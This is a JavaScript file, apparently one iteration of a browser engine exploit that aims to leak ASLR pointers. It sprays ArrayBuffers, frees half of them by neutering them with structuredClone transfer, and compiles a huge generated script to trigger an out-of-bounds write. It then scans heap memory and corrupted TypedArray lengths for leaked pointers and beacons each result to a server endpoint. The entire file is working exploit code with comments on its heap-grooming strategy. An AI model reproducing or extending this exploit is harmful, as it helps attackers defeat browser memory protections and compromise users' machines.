// p156 — Bait-and-switch MetadataTable ASLR leak v2
//
// Root cause of p153 failure (from p310 analysis):
//   sprays[i] = null + GC does NOT free backing stores.
//   Conservative stack scanning pins JSArrayBuffer cells alive.
//   No holes form. MetadataTable goes to fresh page above spray.
//
// Fix: structuredClone(buf, {transfer: [buf]}) neutering.
// This moves the backing store to an ephemeral clone cell.
// setTimeout unwinds stack. GC collects clones. Backing stores freed.
// Real holes in marge bitfit, adjacent to surviving buffers.
//
// DUAL detection:
//   A) Scan surviving spray buffers for OOB write patterns (entry+12 = 0xFFFFFFFF)
//   B) Scan TypedArray targets for m_length corruption (thunk pointer in .length)
//
// Key insight for (B): OOB writes are SPARSE — only 4 offsets per 112B entry.
// For 48-byte TypedArray cells, entry+24 (thunk ptr) can align with cell+24
// (m_length) while the cell header (bytes 0-7) stays INTACT. So .length
// is readable through the normal getter and returns the thunk pointer.
//
// Beacon prefix: V156-

(function() {
  function BS(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V156-' + tag + '?t=' + Date.now(), false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  BS('BOOT');

  var BUF_SZ = 100112;
  var SPRAY_COUNT = 400;
  var TARGET_COUNT = 8000;

  // Phase 1: Spray ArrayBuffers (marge bitfit, same size class as MetadataTable)
  var bufs = new Array(SPRAY_COUNT);
  for (var i = 0; i < SPRAY_COUNT; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }
  BS('SPRAY-' + SPRAY_COUNT);

  // Phase 2: Allocate TypedArray targets at higher addresses
  var targets = new Array(TARGET_COUNT);
  for (var i = 0; i < TARGET_COUNT; i++) {
    targets[i] = new Uint8Array(16);
  }
  BS('TARGETS-' + TARGET_COUNT);

  // Phase 3: Transfer even-indexed buffers via structuredClone
  // Neutering detaches backing store to ephemeral clone (not stack-pinned)
  var transferred = 0;
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      transferred++;
    } catch(e) {
      if (transferred === 0) {
        BS('XFER-ERR-' + e.message.substring(0, 40));
        break;
      }
    }
    bufs[i] = null;
  }
  BS('XFER-' + transferred);

  // Phase 4: Create views on surviving (odd-indexed) buffers
  var views = [];
  var viewIdx = [];
  for (var i = 1; i < SPRAY_COUNT; i += 2) {
    if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
      views.push(new Uint8Array(bufs[i]));
      viewIdx.push(i);
    }
  }
  BS('VIEWS-' + views.length);

  // Phase 5: setTimeout to unwind stack, then GC to collect clone cells
  setTimeout(function() {
    // Heavy GC pressure — multiple rounds
    for (var g = 0; g < 12; g++) {
      var junk = [];
      for (var j = 0; j < 40000; j++) junk.push({x: j});
      junk = null;
    }
    BS('GC-DONE');

    // Phase 6: Build 38M function
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p156fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p156ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { BS('SCRIPT-ERR'); };
    sc.onload = function() {
      BS('COMPILED-' + (window.__p156ok ? 'OK' : 'FAIL'));
      doScan();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }, 300);

  function doScan() {
    // === SCAN A: Check spray buffers for OOB write patterns ===
    var hitBufs = 0;
    var sprayLeaks = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;
      var hasNZ = false;
      for (var q = 0; q < view.length && !hasNZ; q += 112) {
        if (q + 16 <= view.length && u32(view, q + 12) === 0xFFFFFFFF) hasNZ = true;
        else if (q + 32 <= view.length) {
          for (var b = q + 24; b < q + 32; b++) { if (view[b] !== 0) { hasNZ = true; break; } }
        }
      }
      if (!hasNZ) continue;
      hitBufs++;

      // Find entry alignment via m_slowPathCount = 0xFFFFFFFF at entry+12
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      if (bestBase < 0 || bestHits < 3) continue;

      // Extract thunk pointers at entry+24
      for (var eOff = bestBase; eOff + 32 <= view.length && sprayLeaks.length < 5; eOff += 112) {
        if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
        var hasPtr = false;
        for (var b = eOff + 24; b < eOff + 32; b++) { if (view[b]) { hasPtr = true; break; } }
        if (!hasPtr) continue;
        sprayLeaks.push(hex8(view, eOff + 24));
      }
      if (sprayLeaks.length >= 5) break;
    }

    BS('SPRAY-bufs' + hitBufs + '-ptrs' + sprayLeaks.length);

    if (sprayLeaks.length > 0) {
      BS('SPRAY-ASLR-' + sprayLeaks[0]);
      for (var i = 0; i < sprayLeaks.length; i++) BS('SP' + i + '-' + sprayLeaks[i]);
    }

    // === SCAN B: Check TypedArray targets for m_length corruption ===
    var leakN = 0, caseBN = 0, errN = 0;
    var leaked = new Array(30);

    for (var i = 0; i < TARGET_COUNT; i++) {
      try {
        var len = targets[i].length;
        if (len !== 16) {
          if (len > 281474976710656) {
            caseBN++;
          } else if (len > 4096) {
            if (leakN < 30) leaked[leakN] = len;
            leakN++;
          }
          targets[i] = null;
        }
      } catch(e) {
        errN++;
        targets[i] = null;
      }
    }

    BS('TYPED-L' + leakN + '-B' + caseBN + '-E' + errN);

    if (leakN > 0) {
      var p = BigInt(leaked[0]);
      BS('TYPED-ASLR-' + p.toString(16));
      var vals = '';
      for (var j = 0; j < Math.min(leakN, 5); j++) vals += BigInt(leaked[j]).toString(16) + ',';
      BS('TPTRS', vals);
    }

    // === Summary ===
    if (sprayLeaks.length > 0 || leakN > 0) {
      BS('ASLR-LEAK-CONFIRMED');
    } else if (hitBufs > 0 || caseBN > 0 || errN > 0) {
      BS('SWEEP-HIT-MISALIGN');
    } else {
      BS('NO-HIT');
    }

    BS('DONE');
  }
})();
